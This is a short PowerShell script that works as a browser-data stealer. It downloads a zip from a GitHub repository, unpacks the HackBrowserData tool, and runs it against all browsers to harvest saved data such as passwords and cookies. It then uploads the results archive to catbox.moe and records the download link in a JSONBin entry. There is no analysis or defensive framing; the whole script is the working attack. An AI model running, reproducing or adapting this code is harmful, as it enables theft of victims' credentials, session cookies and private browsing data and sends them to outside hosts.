
cd $env:USERPROFILE%
Invoke-WebRequest -Uri "https://github.com/Cancarutu2012/rroll/raw/refs/heads/main/hbd.zip" -OutFile "$env:USERPROFILE\hbd.zip"
cd $env:USERPROFILE

powershell -Command "Expand-Archive -Path '$env:USERPROFILE\hbd.zip' -DestinationPath '$env:USERPROFILE\' -Force"
cd $env:USERPROFILE

& "$env:USERPROFILE\hack-browser-data.exe" -b all -f json --dir results --zip



$zip = Join-Path $env:USERPROFILE "results\results.zip"
$binId = "69dfd5efaaba882197022d02"


# ======================
# CATBOX
# ======================
Write-Host "Uploading to Catbox..."

$link = (curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php).Trim()

Write-Host "Catbox link: $link"

if ([string]::IsNullOrWhiteSpace($link)) {
    Write-Host "ERROR: Catbox failed"
    Read-Host
    exit
}

# ======================
# JSONBIN
# ======================
$body = @{
    link = $link
} | ConvertTo-Json -Compress

Write-Host "Updating JSONBin..."

try {
    Invoke-RestMethod `
        -Uri "https://api.jsonbin.io/v3/b/$binId" `
        -Method PUT `
        -Headers @{
            "Content-Type" = "application/json"
        } `
        -Body $body

    Write-Host "DONE"
}
catch {
    Write-Host "JSONBIN ERROR:"
    Write-Host $_.Exception.Message
}

Read-Host "FINISH"


